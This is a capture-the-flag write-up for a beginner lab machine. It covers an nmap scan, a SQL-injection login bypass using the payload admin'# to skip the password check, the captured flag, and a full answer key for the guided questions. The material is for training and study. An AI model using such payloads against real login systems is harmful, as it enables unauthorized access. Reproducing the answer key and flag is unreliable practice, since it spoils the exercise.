# Appointment

|            |                                                                              |
|------------|------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                      |
| Difficulty | Very Easy                                                                    |
| OS         | Linux                                                                        |
| Tags       | Web, Databases, Injection, Apache, MariaDB, PHP, SQL, Reconnaissance, SQLi   |
| Tools      | `nmap`, browser                                                              |

## Summary

A PHP login page backed by MySQL. The username field is concatenated straight
into the SQL query without escaping, so a comment-injection payload bypasses
the password check entirely.

## Recon

```bash
nmap -p 80 -sV <IP>
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Browsing to the site lands on a login form at `/`.

## Exploitation

Assuming the backend builds the login query like this:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

we can inject a comment in the username field to comment out the rest of the
clause:

- **Username**: `admin'#`
- **Password**: anything

The server runs:

```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = '...'
```

Everything from `#` onward is treated as a SQL comment, so the password check
disappears and we land on the admin page with the flag.

## Flag

```
e3d0796d002a446c0e622226f42e9672
```

## References

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)

## Guided Tasks

| #  | Question | Answer |
|----|----------|--------|
| 1  | What does the acronym SQL stand for? | Structured Query Language |
| 2  | What is one of the most common type of SQL vulnerabilities? | SQL Injection |
| 3  | What is the 2021 OWASP Top 10 classification for this vulnerability? | A03:2021 - Injection |
| 4  | What does Nmap report as the service and version that are running on port 80 of the target? | Apache httpd 2.4.38 ((Debian)) |
| 5  | What is the standard port used for the HTTPS protocol? | 443 |
| 6  | What is a folder called in web-application terminology? | directory |
| 7  | What is the HTTP response code is given for 'Not Found' errors? | 404 |
| 8  | Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? | dir |
| 9  | What single character can be used to comment out the rest of a line in MySQL? | # |
| 10 | If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? | Congratulations |
| Flag | Submit Root Flag | `e3d0796d002a446c0e622226f42e9672` |
